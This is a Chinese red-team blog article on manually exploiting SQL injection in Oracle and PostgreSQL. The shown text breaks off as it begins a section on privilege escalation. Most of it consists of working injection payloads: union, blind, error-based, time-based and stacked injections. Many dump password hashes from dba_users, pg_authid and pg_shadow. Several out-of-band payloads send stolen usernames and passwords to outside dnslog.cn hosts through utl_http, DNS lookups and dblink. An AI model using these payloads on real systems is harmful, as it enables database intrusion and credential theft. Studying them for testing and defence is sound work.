数据库—从注入到提权的全家桶套餐
原创队员编号055 酒仙桥六号部队
2020-08-06原文
这是 酒仙桥六号部队 的第 55 篇文章。
全文共计5397个字，预计阅读时长17分钟。
前言
偶然看到了最新的数据库流行度排名，发现在前5名的关系型数据库
中，日常渗透测试见到最多的便是MySQL，排名第一的Oracle可能
因为企业版高昂的价格限制了用户群众，在实际中相对于MySQL遇到
的偏少，作为完全免费开源的PostgreSQL，虽然也占据了榜单Top
4，但目前在国内碰到的几率也很小。
所以这次先重点研究一下Oracle与PostgreSQL这两种数据库从手
注到提权的不同方式，避免过度依赖sqlmap一把梭的尴尬局面。
SQL注入分析
1.数据库类型判断
身为关系型数据库，自然避免不了SQL注入的话题，而在进行注入前
， 我 们 首 先 要 对 数 据 库 的 种 类 进 行 判 断
Oracle：根据特有的表进行判断：
and (select count(*) from sys.user_tables)>0
PostgreSQL：根据特有的语法判断：
and+1::int=1--
接下来我们从各自的数据库语法去分析不同的SQL注入方式，SQL注
入按照我们熟悉的注入语法又划分为:基于布尔的盲注、基于时间延
迟的盲注、显错注入、联合查询注入、堆查询注入，我们依次来对
两种数据库进行分析。
2.联合查询注入
Oracle
a.在Oracle中，存在dual虚拟表，任何用户都可以去读取查询，因
为Oracle数据库的查询语句必须包含from属性，所以常用在没有目
标表的select查询语句中，比如可以查询当前用户等。
and 1=2 union select null,user,null from dual（获取当前用户名）
b.Oracle联合查询注入需要依次判断每个字段的字段类型，而不能
像mysql中字段直接全部套用数字型。
and 1=2 union select 1,null,null from dual
若返回正常则为整数型，异常则为字符型'null'。
and 1=2 union select 1,'null','null' from dual
c.Oracle数据库不支持mysql中limit功能，但可以通过rownum来
限制返回的结果集的行数.查看前5个数据库用户，数据库用户均存
在dba_users表中。
and 1=2 union select 1,username,password from dba_users where
rownum<=5
d.联合查询注入需要用到查看表结构、字段名等功能，在mysql中
大家所熟知的是information_schema，而在Oracle中同样拥有此
类功能视图。
dba* dba拥有的或可以访问的所有对象
all* 某用户拥有的或可以访问的所有的对象
user_*
某用户拥有的所有对象(必须是拥有者owner，相当于表的创建者)
比如在user_tab_columns中，表名与字段名一一对应展示，可以
同时对表名及字段名进行查询：
and 1=2 union select 1,table_name,column_name from
user_tab_columns where rownum<=2000
e.其他常用语句：
可通过查看数据库文件位置间接判断操作系统。
and 1=2 union select 1,name,'null' from V$DATAFILE
查看数据库版本：
and 1=2 union select 1,version,'null' from v$instance
查看用户权限：
and 1=2 union select 1,privilege,'null' from session_privs
查看主机IP：
and 1=2 unions select utl_inaddr.get_host_address from dual
PostgreSQL
a. 在 order
by确认字段数量后后需跟oracle一样，使用null来填充字段，然后
依次去判断每个字段的字符类型（字符类型用'null',整数型用直
接用整数代替），若直接使用整数型1,2,3来填充则会报错。
and 1=2 union select 1,2,3
and 1=2 union select null,null,null
最终判断出的每个字段的类型，以及页面回显位。
and 1=2 union select 100,'null','null'
b.查询当前数据库使用current_database()函数。
and 1=2 union select 1,current_database(),'null'
c.PostgreSQL数据库中的pg_stat_user_tables相当于mysql中
的information_schema.tables()，realname代替mysql中的t
able_name进行查询。
d.PostgreSQL中的limit与mysql中的使用有所差异，语法为limi
t 1 offset 0。
and 1=2 union select 1,relname,'null' from pg_stat_user_tables
limit 1 offset 0
之后便与mysql中的联合查询注入步骤及用法一样往后进行注入取值
。
and 1=2 union select 1,column_name,'null' from
information_schema.columns where table_name = 'tbuser' limit 1
offset 0
and 1=2 union select 1,username,password from tbuser where id =
2
e.利用sql注入查找超级用户postgres密码PostgreSQL数据库中
用户账号密码存在于pg_authid以及pg_shadow表中。
and 1=2 union select 1,rolname,rolpassword from pg_authid limit
1 offset 0
and 1=2 union select 1,usename,passwd from pg_shadow limit 1
offset 0
此处有个需要注意的地方就是md5解出来的字符并不是全部都为密码
，而是为“密码+账号”，如图所示，123456为用户postgres的密
码。
获取账号密码后，可以远程连接执行sql命令。
3.布尔盲注
Oracle
a.instr()函数:查找一个字符串在指定字符串的出现位置。
and 1=(instr((select user from dual),'S'))
and 2=(instr((select user from dual),'Y'))
and 3=(instr((select user from dual),'S'))
b.decode()函数与substr()函数结合:decode函数为字符串运算
函数，若字符串1等于字符串2，则返回1，不等于则返回0。
and 1=(select decode(user,'SYSTEM',1,0) from dual) -
-
与substr()函数结合，进行布尔盲注。
and 1=(select decode(substr((select username||password from
tbuser),1,1),'t',1,0) from dual) --
and 1=(select decode(substr((select username||password from
tbuser),2,1),'e',1,0) from dual) --
and 1=(select decode(substr((select username||password from
tbuser),3,1),'s',1,0) from dual) --
and 1=(select decode(substr((select username||password from
tbuser),4,1),'t',1,0) from dual) --
c.常规ascii值猜解。
先使用length()判断字符串长度。
and 8=(select length(username||password) from tbuser where
rownum=1)
再逐个字符去猜解ascii码值。
and 116=(select ascii(substr(username||password,1,1)) from
tbuser where rownum=1)
and 101=(select ascii(substr(username||password,2,1)) from
tbuser where rownum=1) and 115=(select
ascii(substr(username||password,3,1)) from tbuser where
rownum=1)and 116=(select ascii(substr(username||password,4,1))
from tbuser where rownum=1)
···
PostgreSQL:
a.常规ascii值猜解
length猜解长度。
and (select length(current_database())) between 0 and 30
拆解每个字符ascii值，之后步骤与oracle相同，不再阐述。
and (select ascii(substr(current_database(),1,1))) between 0 and
127
4.报错注入
Oracle:
utl_inaddr.get_host_name()函数
and 1=utl_inaddr.get_host_name((select username||password from
dba_users where rownum=1))
ctxsys.drithsx.sn()函数
and 1=ctxsys.drithsx.sn(1,(select username from dba_users where
rownum=1))
XMLType()函数
and (select upper(XMLType(chr(60)||chr(58)||(select username
from tbuser where rownum=1)||chr(62))) from dual) is not null
dbms_xdb_version.checkin()函数
and (select dbms_xdb_version.checkin((select username||password
from tbuser where rownum=1)) from dual) is not null
bms_xdb_version.makeversioned()函数
and (select dbms_xdb_version.makeversioned((select
username||password from tbuser where rownum=1)) from dual) is
not null
dbms_xdb_version.uncheckout()函数
and (select dbms_xdb_version.uncheckout((select
username||password from tbuser where rownum=1)) from dual) is
not null
dbms_utility.sqlid_to_sqlhash()函数
and (SELECT dbms_utility.sqlid_to_sqlhash((select
username||password from tbuser where rownum=1)) from dual) is
not null
PostgreSQL
cast()函数
and 1=cast(current_database()::text as int)--
and 1=cast((select relname from pg_stat_user_tables limit 1
offset 0)::text as int)--
之后按照联合查询对应语句依次注入取值即可。
and 1=cast((select username||cpassword from tbuser where
id=2)::text as int)--
5.延时注入
Oracle
dbms_pipe.receive_message() 函 数 DBMS_PIPE.RECEIVE_MES
SAGE('AAA',3)函数，表示将为从管道AAA返回的数据等待3秒判断
是否存在。
and 1=dbms_pipe.receive_message('AAA', 3)
结合decode()函数进行盲注：
and 1=(select
decode(substr(user,1,1),'S',dbms_pipe.receive_message('AAA',3),0
) from dual)
and 1=(select
decode(substr(user,2,1),'Y',dbms_pipe.receive_message('AAA',3),0
) from dual)
and 1=(select
decode(substr(user,3,1),'S',dbms_pipe.receive_message('AAA',3),0
) from dual)
···
PostgreSQL
PostgreSQL中延时睡眠函数pg_sleep()与mysql中的sleep()用
法一致。
and 1=(select 1 from pg_sleep(5))
6.堆查询注入
Oracle
Oralce不支持堆查询注入，尝试堆查询注入直接对';'报错为无效
字符。
PostgerSQL
堆叠注入可以结束上一条sql语句，开启新的sql语句，所以可以进
行的操作也比较多，比如采用与联合查询注入相同的步骤，也可采
用带外注入等。
7.带外注入
Oracle
oracle中包含大量低权限用户可访问的默认功能，可以使用建立带
外连接。utl_http包可用于向其他主机提出任意http请求(需要公
网http服务)。
and (select utl_http.request('dnslog.cn:80'||(select user from
dual))is not null
当没有http服务接收时，可以采用utl_inaddr包将主机名解析为I
P地址，此包可根据指定的服务器生成DNS查询。
and (select utl_inaddr.get_host_address((select user from
dual)||'.tmpgak.dnslog.cn') from dual)is not null
PostgreSQL
支持跨库进行查询，利用数据库拓展dblink实现dns带外注入需要
先创建dblink拓展，若服务器为windows，则可以直接安装拓展。
CREATE EXTENSION dblink;
进行查询：
test.php?uid=1;select * from dblink('host='||(select
passwd from pg_shadow limit 1 offset 1)||'.mn8k6n.dnslog.cn
user=user dbname=dbname','select user')RETURNS (result TEXT);
数据库用户权限提升
Oracle数据库用户提权
提 升 漏 洞 编 号 为 CVE-2006-
2081，漏洞成因由SYS用户运行的DBMS_EXPORT_EXTENSION存储